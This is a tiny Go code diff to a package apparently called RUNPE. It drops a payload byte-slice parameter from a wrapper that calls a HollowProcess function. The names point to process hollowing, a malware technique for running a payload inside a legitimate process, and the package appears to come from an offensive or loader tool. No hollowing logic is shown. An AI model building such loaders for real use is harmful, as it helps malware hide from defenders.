@@ -1,5 +1,5 @@
 package RUNPE
 
-func RUNPE(payloadPath string, targetPath string, payloadByte []byte, arguments string) {
-	HollowProcess(payloadPath, targetPath, payloadByte, arguments)
+func RUNPE(payloadPath string, targetPath string, arguments string) {
+	HollowProcess(payloadPath, targetPath, arguments)
 }
